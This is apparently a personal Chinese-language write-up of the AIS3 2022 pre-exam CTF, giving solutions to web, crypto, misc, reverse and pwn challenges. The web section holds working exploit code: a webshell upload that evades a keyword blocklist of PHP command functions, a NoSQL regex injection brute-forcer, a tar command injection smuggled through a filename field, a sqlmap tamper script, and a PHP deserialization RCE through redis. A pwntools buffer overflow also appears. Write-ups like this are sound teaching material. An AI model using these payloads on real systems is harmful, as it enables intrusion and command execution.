# AIS3 preexam 2022

> 我是菜雞 比較會 web

![](https://i.imgur.com/3pQduEP.png)
![](https://i.imgur.com/A4JdFmF.png)


## Web

### Simple File Uploader

> 100
> easy

* source

```php=
<?php

if(isset($_FILES['file'])) {
    $file_name = basename($_FILES['file']['name']);
    $file_tmp = $_FILES['file']['tmp_name'];
    $file_type = $_FILES['file']['type'];
    $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); 
    
    
    if(in_array($file_ext, ['php', 'php2', 'php3', 'php4', 'php5', 'php6', 'phtml', 'pht'])) {
        die('p...php ?? (((ﾟДﾟ;)))');
    }

    $box = md5(session_start().session_id());
    $dir = './uploads/' . $box . '/';
    if (!file_exists($dir)) {
        mkdir($dir);
    }

    $is_bad = false;
    $file_content = file_get_contents($file_tmp);
    $data = strtolower($file_content);

    if (strpos($data, 'system') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'exec') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'passthru') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'show_source') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'proc_open') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'popen') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'pcntl_exec') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'eval') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'assert') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'die') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'shell_exec') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'create_function') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'call_user_func') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'preg_replace') !== false) {
        $is_bad = true;
    } else if (strpos($data, 'scandir') !== false) {
        $is_bad = true;
    }


    if($is_bad) {
        die('You are bad ヽ(#`Д´)ﾉ');
    }

    $new_filename = md5(time()).'.'.$file_ext;
    move_uploaded_file($file_tmp, $dir.$new_filename);
    echo '
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
        <title>Simple File Uploader</title>
    </head>

    <body>
        <div class="container  is-vcentered  is-centered" style="max-width: 60%; padding-top: 10%;">
            <article class="message">
                <div class="message-header">
                    <p>Upload Success!</p>
                    <button class="delete" aria-label="delete"></button>
                </div>
                <div class="message-body">
                    Upload /uploads/'. $box . '/' . $new_filename .'
                </div>
            </article>
        </div>
    <body>
    </html> ';
} else if (isset($_GET['src'])) {
    show_source("index.php");
} else {
    echo file_get_contents('home.html');
}
?>
```

* 簡單來說就是要上傳 webshell，稍微看一下
  * 會過濾內容，例如說你有 `system` 什麼的函式會被 ban
  * 會過濾副檔名，例如說 `php` 之類的

#### Solution

* 這一題我的作法滿簡單的，直接用 weevely 的 shell，之後副檔名的部分我本來想的有點太多了，其實就一個 `pHp` 的副檔名就可以跑了

### Poking Bear

> 100
> baby

* 稍微觀察一下可以看到 secret bear 是在 350 ~ 777 之間，鎖定 secret bear 的位置之後可以看到 cookie 是 `human=human` 然後說 `You can't poke SECRET BEAR since you are not "bear poker"`，把 cookie 改成 `human=bear poker` 就可以了

#### Solution

```python=
import requests

url = 'http://chals1.ais3.org:8987/poke'

for i in range(350, 777):
    response = requests.post(url, data={
        "bear_id": str(i)
    }, cookies={
        "human": "bear poker"
    })
    print(i)
    print(response.text)
    if "nothing happened" not in response.text and "poke a cat" not in response.text:
        print(response.text)
        break
```

### The Best Login UI

> 432
> easy

* 這題考的是 nosql injection，比較麻煩的是一開始在寫扣的時候沒有考慮到他的 regex 的部分，導致少了很多括號 = =
* 參考 https://book.hacktricks.xyz/pentesting-web/nosql-injection

#### Solution

```python=
import requests
import urllib3
import string
import urllib
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import random

urllib3.disable_warnings()

username="admin"
password="AIS3{"
url = "http://chals1.ais3.org:54088/login"
requests.adapters.DEFAULT_RETRIES = 5
s = requests.session()
s.keep_alive = False
retry = Retry(connect=3, backoff_factor=1)
adapter = HTTPAdapter(max_retries=retry)
s.mount('http://', adapter)
s.mount('https://', adapter)

user_agent_list = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/61.0",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
                    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
                    ]

while True:
    for c in string.printable:
        if c in ['*','+','.','?','|','(', ')', '[', ']', '\\']:
            c = '\\' + c

        print(c)

        try:
            r = s.post(url, headers={
                'Connection': 'close',
                'User-Agent': random.choice(user_agent_list)
            }, data={
                "username[$eq]": username,
                "password[$regex]": "^" + password + c
            }, verify=False)
        except:
            continue

        print(r.text)
        if 'Success' in r.text:
            print("Found one more char : %s" % (password+c))
            password += c
            if c == '}':
                exit()
```

* 是說扣可以不用那麼麻煩，因為我以為是我弄太快才把我 ban 掉，其實是沒有考慮到那些特殊意義的字元的問題

### TariTari

> 456
> easy

* 這一題考 LFI 之後是 command injection，滿直覺的
* 不過在 command injection 那邊卡了一下，本來想的有點太複雜了，後來發現可以直接回顯

#### Solution

* LFI
  * `download.php` 的參數 `file` 把 `../index.php` 用 base64 encode 過後就可以拿到他的 source code 了

```php=
<?php
function get_MyFirstCTF_flag()
{
    // **MyFirstCTF ONLY FLAG**
    // Please IGNORE this flag if you are AIS3 Pre-Exam Player

    // Congratulations, you found the flag!
    // RCE me to get the second flag, it placed in the / directory :D
    echo 'MyFirstCTF FLAG: AIS3{../../3asy_pea5y_p4th_tr4ver5a1}';
}

function tar($file)
{
    $filename = $file['name'];
    $path = bin2hex(random_bytes(16)) . ".tar.gz";
    $source = substr($file['tmp_name'], 1);
    $destination = "./files/$path";
    passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
    if ($return === 0) {
        return [$path, $filename];
    }
    return [FALSE, FALSE];
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $file = $_FILES['file'];
    if ($file === NULL) {
        echo "<p>No file was uploaded.</p>";
    } elseif ($file['error'] !== 0) {
        echo "<p>Error: Upload error.</p>";
    } else {
        [$path, $filename] = tar($file);
        if ($path === FALSE) {
            echo "<p>Error: Failed to create archive.</p>";
        } else {
            $path = base64_encode($path);
            $filename = urlencode($filename);
            echo "<a href=\"/download.php?file=$path&name=$filename.tar.gz\">Download</a>";
        }
    }
}

```

* command injection
  * `passthru` 直接 inject OuOb

```bash=
POST / HTTP/1.1
Host: chals1.ais3.org:9453
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------26667010543677917732775864911
Content-Length: 337
Origin: http://chals1.ais3.org:9453
Connection: close
Referer: http://chals1.ais3.org:9453/
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

-----------------------------26667010543677917732775864911
Content-Disposition: form-data; name="file"; filename="test|' --checkpoint=1 --checkpoint-action=exec='cd .. && cd .. && cd .. && ls -al && cat y000000_i_am_the_f14GGG.txt'  '"
Content-Type: text/php

whatever

-----------------------------26667010543677917732775864911--

```

### Cat Emoji Database 🐱

> 487
> medium

* source

```python=
from flask import Flask, request, redirect, jsonify, send_file
import re

# db.py: not provided
from db import db

app = Flask(__name__)


@app.before_request
def fix_path():
    # trim all the whitespace from path
    trimmed = re.sub('\s+', '', request.path)
    if trimmed != request.path:
        return redirect(trimmed)


@app.route('/')
def index():
    return send_file('index.html')


@app.route('/api/all')
def emojis():
    cursor = db().cursor()
    cursor.execute("SELECT Name FROM Emoji")
    return jsonify(cursor.fetchall())


@app.route('/api/emoji/<unicode>')
def api(unicode):
    cursor = db().cursor()
    cursor.execute("SELECT * FROM Emoji WHERE Unicode = %s" % unicode)
    row = cursor.fetchone()
    if row:
        return jsonify({'data': row})
    else:
        return jsonify({'error': 'Cat emoji not found'})


@app.route('/source')
def source():
    return send_file(__file__, mimetype='text/plain')

```

* 滿明顯的 sql injection，現在問題是不能用空白，也不能用 `/**/` bypass，因為這樣就切換目錄了
* 本來想說要用 `(0)or(1)=(1)` 這種方式 bypass，後來找一下發現可以用 `%01` bypass，直接上 sqlmap，掛上寫好的 tamper 就可以快樂拿 flag 了
* 這題是 medium 最主要的原因應該就是他的 dbms 不是 mysql 而是 mssql

#### Solution

```python=
#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    A tamper for AIS3 preexam Cat Emoji Database 🐱

    Tested against:
        * AIS3 preexam 2022 Cat Emoji Database 🐱

    >>> tamper(' ')
    '%01'
    """

    retVal = payload.replace(' ', '%01')

    return retVal
```

### Private Browsing
> 500
> hard
* 這一題是事後才想到的，比賽中是沒有想到的，我就爛 OuOb
```php=
function __destruct()
{
    global $redis;
    if ($this->val !== null) {
        $redis->set($this->sessid, ($this->encode)($this->val));
    }
}
```
* 簡單來說，不能用 `get()` 達到 RCE，因為 redis 拿的是 object 給他的，所以 `__destruct()` 中的 `global $redis` 正好是我們需要的
* 把 `$encode` 指定成 `system`，`$this->val` 就可以給 command 達成 RCE
```php=
...
    function __construct($redis, $sessid, $fallback, $encode = 'serialize', $decode = 'unserialize')
    {
        $this->redis = $redis;
        $this->sessid = $sessid;
        $this->encode = $encode;
        $this->decode = $decode;
        $this->fallback = $fallback;
        $this->val = "ls"; // <- here
    }
...

$a = new SessionManager($redis, "whatever", "whatever", "system"); // <- here
```

#### Solution
```python=
import requests

def payloadGenerator(command):
    command_len = len(command)
    session = 'O:14:"SessionManager":6:{s:5:"redis";O:5:"Redis":0:{}s:6:"sessid";s:4:"test";s:6:"encode";s:6:"system";s:6:"decode";s:11:"unserialize";s:8:"fallback";s:7:"phpinfo";s:3:"val";s:' + str(command_len) + ':"' + command + '";}'
    session = session.encode("utf-8").hex()
    final_session = ""

    for i in range(0, len(session)+1, 2):
        if session[i:i+2] == "":
            break

        tmp = r"\x" + session[i:i+2]
        final_session += tmp

    return final_session

def RCE(cookie, command):
    requests.get("http://chals1.ais3.org:8763/api.php?action=view&url=dict://redis:6379/set:{}:\"{}\"".format(cookie, payloadGenerator(command)))

    response = requests.get("http://chals1.ais3.org:8763/api.php?action=clear_history", cookies={
        "sess_id": cookie
    })

    for i in response.text.split('\n')[7:]:
        print(i)

RCE("whatever", "/readflag")
```

## Crypto

### SC

> 100
> baby

* 開宗明義已經說了是 Substitution cipher，寫個 Python code 觀察一下，替代一下就有 flag 了

#### Solution

```python=
file_o = open("cipher.py")
file_e = open("cipher.py.enc")
sub = {}

for i, j in zip(file_o.read(), file_e.read()):
    print(i, j)
    sub[j] = i

print(sub)

sub = {'D': 'i', 'X': 'm', 'P': 'p', 'p': 'o', 'i': 'r', '6': 't', ' ': ' ', 'I': 's', 'w': 'n', 'T': 'g', '\n': '\n', 'c': 'a', 'k': 'd', 's': 'e', 'q': 'f', 'z': 'h', '2': 'u', 'n': 'l', '(': '(', '8': 'x', ')': ')', ':': ':', '=': '=', '.': '.', 'O': 'c', 'j': 'y', 'B': 'T', ',': ',', 'F': 'w', '"': '"', '{': '{', '}': '}', '_': '_', '+': '+', 'f': 'j', 'a': 'k', 'v': 'S', '4': 'b', '0': 'F', 'S': 'W', 'g': 'J', 'C': 'v', 'R': 'P', 'E': 'U', '–': '–', '·': '·', '7': 'O', '9': 'R', 'h': 'M', 'G': '2', 'V': '0', 'Y': '9', 'u': 'L', 'x': 'I', ';': ';', '1': 'q', 'Q': 'B', '5': 'A', '3': 'C', 'W': '1', '\t': '\t', 'y': 'N', 'J': '3', 'A': 'H', 'm': '4', 't': '5', 'K': '6', 'M': '7', '-': '-', 'U': '8', 'Z': 'E'}

file_flag = open("flag.txt.enc").read()

for i in file_flag:
    print(sub[i], end="")

print()
```

### Fast Cipher

> 100
> baby

* 稍微觀察一下可以看到後面的部分是沒有變的，推論只有前面的會變，因此把一些字母啊數字之類的放在後面把結果搜集一下就可以拿到 flag，前面的部分是 `AIS3{` 只需要猜兩個字母，選句意比較通順的那一個就是 flag 了

#### Solution

```python=
flag_hex = "6c 0e c8 40 f8 8d 4c d7 fc c6 d5 c6 d1 da fc c1 ca d7 d0 fc c2 d1 c6 fc d6 d0 c6 c7 fc cf cc cf de".split()

decimal = [int(hex, 16) for hex in flag_hex]
print(decimal)

# import string
# print(string.printable)

d = [147, 146, 145, 144, 151, 150, 149, 148, 155, 154, 194, 193, 192, 199, 198, 197, 196, 203, 202, 201, 200, 207, 206, 205, 204, 211, 210, 209, 208, 215, 214, 213, 212, 219, 218, 217, 226, 225, 224, 231, 230, 229, 228, 235, 234, 233, 232, 239, 238, 237, 236, 243, 242, 241, 240, 247, 246, 245, 244, 251, 250, 249, 130, 129, 128, 135, 134, 133, 132, 139, 138, 137, 136, 143, 142, 141, 140, 153, 152, 159, 158, 157, 156, 227, 248, 255, 254, 253, 252, 195, 216, 223, 222, 221, 131]
dic = {147: '0', 146: '1', 145: '2', 144: '3', 151: '4', 150: '5', 149: '6', 148: '7', 155: '8', 154: '9', 194: 'a', 193: 'b', 192: 'c', 199: 'd', 198: 'e', 197: 'f', 196: 'g', 203: 'h', 202: 'i', 201: 'j', 200: 'k', 207: 'l', 206: 'm', 205: 'n', 204: 'o', 211: 'p', 210: 'q', 209: 'r', 208: 's', 215: 't', 214: 'u', 213: 'v', 212: 'w', 219: 'x', 218: 'y', 217: 'z', 226: 'A', 225: 'B', 224: 'C', 231: 'D', 230: 'E', 229: 'F', 228: 'G', 235: 'H', 234: 'I', 233: 'J', 232: 'K', 239: 'L', 238: 'M', 237: 'N', 236: 'O', 243: 'P', 242: 'Q', 241: 'R', 240: 'S', 247: 'T', 246: 'U', 245: 'V', 244: 'W', 251: 'X', 250: 'Y', 249: 'Z', 130: '!', 129: '"', 128: '#', 135: '$', 134: '%', 133: '&', 132: "'", 139: '(', 138: ')', 137: '*', 136: '+', 143: ',', 142: '-', 141: '.', 140: '/', 153: ':', 152: ';', 159: '<', 158: '=', 157: '>', 156: '?', 227: '@', 248: '[', 255: '\\', 254: ']', 253: '^', 252: '_', 195: '`', 216: '{', 223: '|', 222: '}', 221: '~', 131: ' '}
for i, j in zip("""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ """, d):
    dic[j] = i

# print(dic)

flag = [226, 234, 240, 144, 216, 141, 76, 215, 252, 198, 213, 198, 209, 218, 252, 193, 202, 215, 208, 252, 194, 209, 198, 252, 214, 208, 198, 199, 252, 207, 204, 207, 222]

for i in flag:
    if i < 131:
        continue

    print(dic[i], end="")

print()

flag = "AIS3{..t_every_bits_are_used_lol}"

for i in "abcdefghijklmnopqrstuvwxyz":
    for j in "abcdefghijklmnopqrstuvwxyz":
        print("AIS3{" + i + j + "t_every_bits_are_used_lol}")
```

## Misc

### Excel

> 100
> baby

* 這一題逐步執行巨集就可以看到 flag 了

#### Solution

* 逐步執行巨集

### Gift in the dream

> 100
> medium

* 這一題直覺上是把 gif 分解，就可以看到 flag 了

#### Solution

* `identify -format "%T \n" gift_in_the_dream_updated.gif`

* 把 decimal 轉成 ascii 就是 flag 了

## Reverse

### Time Management

> 100
> baby

* 這一題用 IDA 看一下可以看到有一個 sleep 一直在卡，用 gdb 跳到下一個位置就可以拿到 flag 了

#### Solution

* 用 IDA 跟 gdb
* 我的方法比較笨要一直 continue 一個一個拿 flag QAQ

## Pwn

### SAAS - Crash

> 40
> C++ heap easy

* 這一題把它弄壞就好，又本人不會 pwn，真的是隨便 create 一個再刪除掉他就壞掉了

#### Solution

* 同說明

### BOF2WIN

> 100
> baby

* buffer overflow，沒啥好說的

#### Solution

```python=
from pwn import *
r = remote('chals1.ais3.org', 12347)
r.recvuntil('What\'s your name?')
target_address = p64(0x401216)
r.sendline(b'A' * 24 + target_address)
r.interactive()
```

## 心得

老了，熬夜的體力大不如前了，加上這學期好多專題 QAQ，真的是無法一直打，這次很多題目都滿有趣的，也看到出題者在 DC 聊天的內容，像是說題目難度判斷有誤之類的 w

有點可惜這次的題目有一些有想法但是礙於實在是事情有點多無法在時間內完成，不過還是挺好玩的 OuOb